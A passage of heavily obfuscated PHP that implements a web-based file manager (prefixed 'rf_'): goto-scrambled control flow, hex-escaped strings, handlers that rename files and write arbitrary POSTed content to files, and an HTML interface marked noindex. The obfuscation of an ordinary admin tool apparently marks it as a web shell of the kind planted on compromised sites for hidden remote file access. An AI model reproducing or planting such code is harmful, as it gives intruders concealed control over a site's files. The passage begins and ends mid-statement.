                <?php  flush(); $ii++; } goto gB7_I; Td0sR: $sticky_navbar = true; goto Hw0Ey; AMnaR: $lang = isset($cfg->data["\x6c\141\x6e\147"]) ? $cfg->data["\154\x61\x6e\x67"] : "\x65\x6e"; goto El6Mt; lxONR: unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style); goto K7Awh; usGdy: echo lng("\x4e\141\155\x65"); goto LNze_; DqKlV: define("\115\101\130\x5f\125\x50\x4c\117\x41\x44\x5f\123\111\132\x45", $max_upload_size_bytes); goto b1LvH; VhIIr: $favicon_path = "\77\x69\x6d\x67\x3d\146\141\166\151\143\157\156"; goto pR70P; Uo3HX: $objects = is_readable($path) ? scandir($path) : array(); goto gJ6aK; Qq1ch: function rf_get_zif_info($path, $ext) { if ($ext == "\172\x69\x70" && function_exists("\x7a\x69\160\x5f\157\x70\145\x6e")) { $arch = zip_open($path); if ($arch) { $filenames = array(); while ($zip_entry = zip_read($arch)) { $zip_name = zip_entry_name($zip_entry); $zip_folder = substr($zip_name, -1) == "\57"; $filenames[] = array("\156\141\155\x65" => $zip_name, "\146\x69\154\x65\x73\151\172\145" => zip_entry_filesize($zip_entry), "\x63\x6f\155\160\162\x65\163\x73\145\144\137\x73\151\172\x65" => zip_entry_compressedsize($zip_entry), "\x66\157\x6c\x64\x65\162" => $zip_folder); } zip_close($arch); return $filenames; } } elseif ($ext == "\x74\x61\x72" && class_exists("\x50\150\x61\162\104\x61\164\141")) { $archive = new PharData($path); $filenames = array(); foreach (new RecursiveIteratorIterator($archive) as $file) { $parent_info = $file->getPathInfo(); $zip_name = str_replace("\x70\x68\x61\162\72\x2f\57" . $path, '', $file->getPathName()); $zip_name = substr($zip_name, ($pos = strpos($zip_name, "\57")) !== false ? $pos + 1 : 0); $zip_folder = $parent_info->getFileName(); $zip_info = new SplFileInfo($file); $filenames[] = array("\x6e\141\155\x65" => $zip_name, "\x66\x69\x6c\145\x73\151\x7a\x65" => $zip_info->getSize(), "\143\x6f\x6d\x70\x72\x65\x73\163\x65\144\137\163\x69\172\145" => $file->getCompressedSize(), "\146\157\x6c\x64\145\162" => $zip_folder); } return $filenames; } return false; } goto hKZ7b; W7yYA: $p = rf_clean_path($p); goto v3_sd; O8se2: $is_https = isset($_SERVER["\110\x54\x54\x50\123"]) && ($_SERVER["\x48\x54\x54\120\x53"] == "\157\x6e" || $_SERVER["\110\124\x54\120\123"] == 1) || isset($_SERVER["\110\x54\124\120\x5f\130\137\x46\117\x52\x57\x41\x52\104\x45\x44\x5f\120\122\117\x54\x4f"]) && $_SERVER["\110\124\x54\120\137\130\137\106\x4f\x52\127\x41\122\104\x45\104\137\x50\122\117\x54\117"] == "\x68\x74\x74\160\163"; goto TTtqL; NCJvq: define("\162\x66\x5f\120\101\x54\110", $p); goto AQwlR; fOum0: $p = isset($_GET["\x70"]) ? $_GET["\x70"] : (isset($_POST["\160"]) ? $_POST["\x70"] : ''); goto W7yYA; a7JvZ: $ip_silent = true; goto yvR57; O7_M8: ?>
                <th><?php  goto BbmHb; deMPM: ?>
">
    <input type="hidden" name="group" value="1">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php  goto I53Fd; XGp9Y: $files = array(); goto tmJlV; MzfoW: rf_show_footer(); goto kHMns; Nywcq: if (isset($_GET["\154\157\x67\157\x75\164"])) { unset($_SESSION[rf_SESSION_ID]["\x6c\x6f\147\147\145\144"]); rf_redirect(rf_SELF_URL); } goto AS7gu; tmJlV: $current_path = array_slice(explode("\x2f", $path), -1)[0]; goto Pw36n; El6Mt: $show_hidden_files = isset($cfg->data["\x73\150\x6f\167\137\150\x69\x64\x64\x65\x6e"]) ? $cfg->data["\163\150\x6f\x77\137\150\x69\x64\x64\145\156"] : true; goto yq2pk; WMr6u: function rf_show_header() { $sprites_ver = "\x32\x30\61\66\60\63\61\x35"; header("\103\157\156\164\145\156\164\x2d\124\171\x70\145\x3a\40\164\145\170\x74\x2f\x68\164\x6d\x6c\x3b\40\x63\x68\141\162\x73\145\164\75\x75\x74\146\x2d\x38"); header("\105\170\160\x69\162\x65\163\x3a\40\123\141\x74\x2c\40\62\66\40\112\165\x6c\x20\61\x39\71\67\40\x30\x35\72\60\x30\x3a\60\60\x20\107\x4d\124"); header("\103\141\x63\x68\145\x2d\x43\x6f\156\x74\162\x6f\154\x3a\40\156\x6f\55\163\x74\x6f\x72\x65\54\x20\156\157\55\143\141\143\150\x65\54\40\x6d\165\163\164\55\162\145\166\x61\154\x69\x64\x61\x74\x65\54\40\160\157\x73\164\55\143\150\x65\143\153\75\60\54\40\160\x72\145\x2d\x63\150\x65\x63\x6b\x3d\x30"); header("\x50\x72\141\147\x6d\x61\x3a\40\x6e\157\55\x63\141\143\150\x65"); global $lang, $root_url, $sticky_navbar, $favicon_path; $isStickyNavBar = $sticky_navbar ? "\156\x61\166\x62\x61\x72\x2d\146\x69\x78\145\x64" : "\x6e\141\x76\142\x61\x72\x2d\156\157\162\155\x61\x6c"; ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with File Manager">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link rel="icon" href="<?php  echo rf_enc($favicon_path); ?>
" type="image/png">
    <title><?php  echo rf_enc(APP_TITLE); ?>
</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" />
    <?php  if (rf_USE_HIGHLIGHTJS) { ?>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/<?php  echo rf_HIGHLIGHTJS_STYLE; ?>
.min.css">
    <?php  } ?>
    <style>
        body { font-size:14px;color:#222;background:#F7F7F7; }
        body.navbar-fixed { margin-top:55px; }
        a:hover, a:visited, a:focus { text-decoration:none !important; }
        * { -webkit-border-radius:0 !important;-moz-border-radius:0 !important;border-radius:0 !important; }
        .filename, td, th { white-space:nowrap  }
        .navbar-brand { font-weight:bold; }
        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
        .nav-item.avatar a > i { font-size:15px; }
        .nav-item.avatar .dropdown-menu a { font-size:13px; }
        #search-addon { font-size:12px;border-right-width:0; }
        #search-addon2 { background:transparent;border-left:0; }
        .bread-crumb { color:#cccccc;font-style:normal; }
        #main-table .filename a { color:#F0FFFF; }
        .table { margin-bottom: 10px }
        .table td, .table th { vertical-align:middle !important; }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; }
        .table-sm td, .table-sm th { padding:.4rem; }
        .table-bordered td, .table-bordered th { border:1px solid #808080; }
        .hidden { display:none  }
        pre.with-hljs { padding:0  }
        pre.with-hljs code { margin:0;border:0;overflow:visible  }
        code.maxheight, pre.maxheight { max-height:512px  }
        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
        .fa.fa-home { font-size:16px }
        .path { margin-bottom:10px  }
        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
        .right { text-align:right  }
        .center, .close, .login-form { text-align:center  }
        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
        .message.ok { border-color:green;color:green  }
        .message.error { border-color:red;color:red  }
        .message.alert { border-color:orange;color:orange  }
        .preview-img { max-width:100%;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC)  }
        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px;border-radius:3px !important;  }
        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
        .compact-table { border:0;width:auto  }
        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
        .compact-table tr:hover td { background-color:#fff  }
        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
        .break-word { word-wrap:break-word;margin-left:30px  }
        .break-word.float-left a { color:#7d7d7d  }
        .break-word + .float-right { padding-right:30px;position:relative  }
        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
        @media (max-width:481px) { 
            #editor { top:150px; }
        }
        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
        .btn-2 { border-radius:0;padding:3px 6px;font-size:small; }
        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
        li.folder:before { content:"\f114" }
        i.fa.fa-folder { color:#eeae4a }
        i.fa.fa-picture-o { color:#26b99a }
        i.fa.fa-file-archive-o { color:#da7d7d }
        .btn-2 i.fa.fa-file-archive-o { color:inherit }
        i.fa.fa-css3 { color:#f36fa0 }
        i.fa.fa-code { color:#007bff }
        i.fa.fa-file-code-o { color:#cc4b4c }
        i.fa.fa-file-text-o { color:#0096e6 }
        i.fa.fa-html5 { color:#d75e72 }
        i.fa.fa-file-excel-o { color:#09c55d }
        i.fa.fa-file-powerpoint-o { color:#f6712e }
        i.go-back { font-size:1.2em;color:#007bff; }
        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
        .dataTables_filter { display:none; }
        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
        .footer-action li { margin-bottom:10px; }
        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
        .ekko-lightbox .modal-dialog { max-width:98%; }
        .ekko-lightbox-item.fade.in.show .row { background:#fff; }
        .ekko-lightbox-nav-overlay { display:flex !important;opacity:1 !important;height:auto !important;top:50%; }
        .ekko-lightbox-nav-overlay a { opacity:1 !important;width:auto !important;text-shadow:none !important;color:#3B3B3B; }
        .ekko-lightbox-nav-overlay a:hover { color:#20507D; }
        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        @keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        #main-table span.badge { border-bottom:2px solid #f8f9fa }
        #main-table span.badge:nth-child(1) { border-color:#df4227 }
        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
        #main-table span.badge:nth-child(4) { border-color:#4581ff }
        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6.text-right { padding:0; }
        }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
        .lds-facebook { display:none;position:relative;width:64px;height:64px }
        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0 }
        @keyframes lds-facebook { 0% { top:6px;height:51px }
        100%,50% { top:19px;height:26px }
        }
        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
        .c-preview-img {
            max-width: 300px;
        }
        .fa-trash-o{background:#c0392b !important;}
    </style>
    <?php  if (rf_THEME == "\144\x61\162\153") { ?>
        <style>
            body.theme-dark { background-color: #2f2a2a; }
            .list-group .list-group-item { background: #343a40; }
            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #ffffff; }
            a, a:hover, a:visited, a:active, #main-table .filename a { color: #00ff1f; }
            ul#search-wrapper li:nth-child(odd) { background: #f9f9f9cc; }
            .theme-dark .btn-outline-primary { color: #00ff1f; border-color: #00ff1f; }
            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #028211;}
        </style>
    <?php  } ?>
</head>
<body class="<?php  echo rf_THEME == "\x64\x61\162\153" ? "\x74\x68\x65\x6d\x65\55\x64\141\x72\153" : ''; ?>
 <?php  echo $isStickyNavBar; ?>
">
<div id="wrapper" class="container-fluid">

    <!-- New Item creation -->
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" aria-label="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content <?php  echo rf_get_theme(); ?>
">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php  echo lng("\103\x72\x65\x61\164\x65\116\145\x77\x49\x74\145\155"); ?>
</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php  echo lng("\111\164\145\155\x54\171\x70\145"); ?>
 </label></p>

                    <div class="custom-control custom-radio custom-control-inline">
                        <input type="radio" id="customRadioInline1" name="newfile" value="file" class="custom-control-input">
                        <label class="custom-control-label" for="customRadioInline1"><?php  echo lng("\106\x69\x6c\145"); ?>
</label>
                    </div>

                    <div class="custom-control custom-radio custom-control-inline">
                        <input type="radio" id="customRadioInline2" name="newfile" value="folder" class="custom-control-input" checked="">
                        <label class="custom-control-label" for="customRadioInline2"><?php  echo lng("\x46\x6f\154\x64\x65\x72"); ?>
</label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php  echo lng("\111\164\x65\155\x4e\x61\x6d\x65"); ?>
 </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-outline-primary" data-dismiss="modal"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\x61\x6e\143\145\x6c"); ?>
</button>
                    <button type="button" class="btn btn-success" onclick="newfolder('<?php  echo rf_enc(rf_PATH); ?>
');return false;"><i class="fa fa-check-circle"></i> <?php  echo lng("\x43\162\x65\x61\x74\x65\116\157\x77"); ?>
</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal -->
    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content <?php  echo rf_get_theme(); ?>
">
          <div class="modal-header">
            <h5 class="modal-title col-10" id="searchModalLabel">
                <div class="input-group input-group">
                    <input type="text" class="form-control" placeholder="<?php  echo lng("\123\145\x61\162\143\150"); ?>
 a files" aria-label="<?php  echo lng("\123\x65\x61\162\143\x68"); ?>
" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                    <div class="input-group-append">
                        <span class="input-group-text" id="search-addon3"><i class="fa fa-search-plus"></i></span>
                    </div>
                </div>
            </h5>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body">
            <form action="" method="post">
                <div class="lds-facebook"><div></div><div></div><div></div></div>
                <ul id="search-wrapper">
                    <p class="m-2">Search file in folder and subfolders...</p>
                </ul>
            </form>
          </div>
        </div>
      </div>
    </div>
    <script type="text/html" id="js-tpl-modal">
        <div class="modal fade" id="js-ModalCenter-<%this.id%>" tabindex="-1" role="dialog" aria-labelledby="ModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="ModalCenterTitle"><%this.title%></h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <%this.content%>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-outline-primary" data-dismiss="modal"><i class="fa fa-times-circle"></i> <?php  echo lng("\x43\141\x6e\143\x65\154"); ?>
</button>
                        <%if(this.action){%><button type="button" class="btn btn-primary" id="js-ModalCenterAction" data-type="js-<%this.action%>"><%this.action%></button><%}%>
                    </div>
                </div>
            </div>
        </div>
    </script>

    <?php  } goto gP8FS; GznSZ: define("\x72\x66\137\122\x45\101\104\x4f\x4e\114\131", $use_auth && !empty($readonly_users) && isset($_SESSION[rf_SESSION_ID]["\154\x6f\147\147\145\144"]) && in_array($_SESSION[rf_SESSION_ID]["\x6c\x6f\x67\x67\x65\144"], $readonly_users)); goto m_DBF; EvF0r: if (isset($_GET["\x72\145\156"], $_GET["\x74\x6f"]) && !rf_READONLY) { $old = $_GET["\162\x65\156"]; $old = rf_clean_path($old); $old = str_replace("\57", '', $old); $new = $_GET["\164\157"]; $new = rf_clean_path(strip_tags($new)); $new = str_replace("\57", '', $new); $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\57" . rf_PATH; } if (rf_isvalid_filename($new) && $old != '' && $new != '') { if (rf_rename($path . "\57" . $old, $path . "\x2f" . $new)) { rf_set_msg(sprintf("\x52\145\156\x61\x6d\145\x64\40\x66\162\x6f\x6d\40\x3c\142\76\45\x73\74\57\142\x3e\40\x74\x6f\x20\74\142\x3e\x25\163\x3c\57\x62\76", rf_enc($old), rf_enc($new))); } else { rf_set_msg(sprintf("\105\162\162\157\x72\x20\167\x68\x69\x6c\x65\x20\162\145\156\141\155\x69\156\x67\x20\146\x72\157\x6d\x20\x3c\142\x3e\x25\163\x3c\57\x62\x3e\40\x74\x6f\x20\x3c\142\x3e\x25\x73\x3c\57\142\x3e", rf_enc($old), rf_enc($new)), "\145\x72\162\x6f\x72"); } } else { rf_set_msg("\x49\156\166\x61\x6c\x69\144\40\x63\150\x61\x72\x61\x63\164\145\x72\x73\40\x69\156\40\146\151\x6c\x65\40\x6e\x61\155\145", "\x65\x72\162\x6f\x72"); } rf_redirect(rf_SELF_URL . "\x3f\x70\75" . urlencode(rf_PATH)); } goto XP2FH; V_CO9: $root_path = rtrim($root_path, "\x5c\x2f"); goto s2nb1; ES_eY: function rf_get_text_mimes() { return array("\x61\x70\x70\x6c\151\143\x61\164\x69\x6f\156\57\x78\155\x6c", "\x61\160\160\154\x69\x63\141\x74\x69\157\156\57\x6a\x61\166\141\x73\x63\162\151\160\x74", "\141\x70\x70\x6c\151\143\x61\x74\x69\x6f\x6e\x2f\170\55\152\141\x76\141\163\x63\162\x69\x70\164", "\x69\155\x61\147\145\x2f\163\x76\147\x2b\x78\x6d\x6c", "\x6d\145\163\163\141\x67\145\x2f\162\146\x63\70\62\x32"); } goto L3oIR; qXB2e: $directories_users = array(); goto BnhBk; v3_sd: $input = file_get_contents("\160\150\160\72\57\57\x69\156\x70\x75\x74"); goto XOMik; Gnpij: if (isset($_GET["\145\144\151\164"])) { $file = $_GET["\x65\x64\151\x74"]; $file = rf_clean_path($file, false); $file = str_replace("\x2f", '', $file); if ($file == '' || !is_file($path . "\x2f" . $file)) { rf_set_msg("\x46\151\x6c\145\40\x6e\157\164\40\146\x6f\x75\x6e\x64", "\x65\x72\162\157\x72"); rf_redirect(rf_SELF_URL . "\77\x70\75" . urlencode(rf_PATH)); } header("\x58\55\x58\x53\x53\55\120\162\x6f\x74\145\143\164\151\157\156\x3a\60"); rf_show_header(); rf_show_nav_path(rf_PATH); $file_url = rf_ROOT_URL . rf_convert_win((rf_PATH != '' ? "\57" . rf_PATH : '') . "\57" . $file); $file_path = $path . "\x2f" . $file; $isNormalEditor = true; if (isset($_GET["\145\x6e\166"])) { if ($_GET["\x65\x6e\x76"] == "\x61\143\145") { $isNormalEditor = false; } } if (isset($_POST["\163\x61\166\145\144\141\x74\x61"])) { $writedata = $_POST["\x73\141\166\145\x64\x61\x74\141"]; $fd = fopen($file_path, "\167"); @fwrite($fd, $writedata); fclose($fd); rf_set_msg("\106\151\154\x65\x20\123\141\166\x65\144\x20\x53\165\143\x63\145\x73\x73\x66\x75\154\154\171"); } $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); $mime_type = rf_get_mime_type($file_path); $filesize = filesize($file_path); $is_text = false; $content = ''; if (in_array($ext, rf_get_text_exts()) || substr($mime_type, 0, 4) == "\164\x65\170\164" || in_array($mime_type, rf_get_text_mimes())) { $is_text = true; $content = file_get_contents($file_path); } ?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php  if (!$isNormalEditor) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="Fullscreen"><i class="fa fa-expand" title="Fullscreen"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="Search"><i class="fa fa-search" title="Search"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="Undo"><i class="fa fa-undo" title="Undo"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="Redo"><i class="fa fa-repeat" title="Redo"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="Word Wrap"><i class="fa fa-text-width" title="Word Wrap"></i></button>
                            <button data-cmd="none" data-option="help" class="btn btn-sm btn-outline-secondary" id="js-ace-goLine" title="Help"><i class="fa fa-question" title="Help"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="Select Document Type" class="btn-outline-secondary border-left-0 d-none d-md-block"><option>-- Select Mode --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="Select Theme" class="btn-outline-secondary border-left-0 d-none d-lg-block"><option>-- Select Theme --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="Selct Font Size" class="btn-outline-secondary border-left-0 d-none d-lg-block"><option>-- Select Font Size --</option></select>
                        </div>
                    <?php  } ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-right pt-1">
                <a title="Back" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(rf_PATH)); ?>
&amp;view=<?php  echo urlencode($file); ?>
"><i class="fa fa-reply-all"></i> <?php  echo lng("\102\141\143\153"); ?>
</a>
                <a title="Backup" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php  echo urlencode(trim(rf_PATH)); ?>
','<?php  echo urlencode($file); ?>
')"><i class="fa fa-database"></i> <?php  echo lng("\x42\x61\x63\153\125\x70"); ?>
</a>
                <?php  if ($is_text) { ?>
                    <?php  if ($isNormalEditor) { ?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(rf_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php  echo lng("\101\144\166\141\156\x63\x65\144\105\144\151\x74\x6f\x72"); ?>
</a>
                        <button type="button" class="btn btn-sm btn-outline-primary name="Save" data-url="<?php  echo rf_enc($file_url); ?>
" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php  } else { ?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(rf_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
"><i class="fa fa-text-height"></i> <?php  echo lng("\x4e\157\162\155\x61\154\105\144\x69\164\x6f\162"); ?>
</a>
                        <button type="button" class="btn btn-sm btn-outline-primary" name="Save" data-url="<?php  echo rf_enc($file_url); ?>
" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php  echo lng("\123\x61\166\145"); ?>
                        </button>
                    <?php  } ?>
                <?php  } ?>
            </div>
        </div>
        <?php  if ($is_text && $isNormalEditor) { echo "\74\x74\x65\x78\x74\x61\x72\x65\141\40\143\154\x61\x73\163\x3d\x22\x6d\164\x2d\x32\x22\40\x69\144\x3d\42\x6e\157\162\155\x61\154\x2d\145\144\x69\164\x6f\162\42\x20\x72\x6f\167\163\75\x22\63\x33\42\40\x63\x6f\x6c\x73\75\42\61\x32\x30\42\40\163\x74\x79\154\145\x3d\42\167\151\144\x74\x68\72\x20\71\x39\56\65\x25\73\x22\x3e" . htmlspecialchars($content) . "\74\57\x74\x65\x78\x74\x61\162\x65\141\76"; } elseif ($is_text) { echo "\74\144\151\166\x20\x69\x64\75\42\145\144\x69\164\x6f\162\42\x20\x63\x6f\156\164\x65\156\x74\145\x64\x69\x74\141\x62\x6c\x65\75\42\164\x72\165\x65\42\76" . htmlspecialchars($content) . "\x3c\x2f\144\x69\x76\x3e"; } else { rf_set_msg("\106\x49\x4c\105\40\105\x58\124\x45\116\x53\x49\x4f\116\40\110\x41\x53\x20\116\x4f\x54\x20\123\125\120\120\x4f\122\x54\x45\104", "\x65\x72\162\x6f\x72"); } ?>
    </div>
    <?php  rf_show_footer(); die; } goto rFzQC; Wft1K: $http_host = $_SERVER["\110\124\124\x50\x5f\x48\117\123\x54"]; goto qXB2e; Hw0Ey: $max_upload_size_bytes = 2048; goto yRyaa; BbmHb: echo lng("\101\x63\164\x69\x6f\x6e\163"); goto B5Yn1; OO9nk: ?>
                <th><?php  goto usGdy; YxWpB: if (empty($folders) && empty($files)) { ?>
                <tfoot>
                    <tr><?php  if (!rf_READONLY) { ?>
                            <td></td><?php  } ?>
                        <td colspan="<?php  echo !rf_IS_WIN && !$hide_cols ? "\66" : "\x34"; ?>
"><em><?php  echo "\106\157\154\144\145\162\x20\x69\x73\40\x65\x6d\x70\164\171"; ?>
</em></td>
                    </tr>
                </tfoot>
                <?php  } else { ?>
                <tfoot>
                    <tr>
                        <td class="gray" colspan="<?php  echo !rf_IS_WIN && !$hide_cols ? "\x37" : "\65"; ?>
">
                        <center>
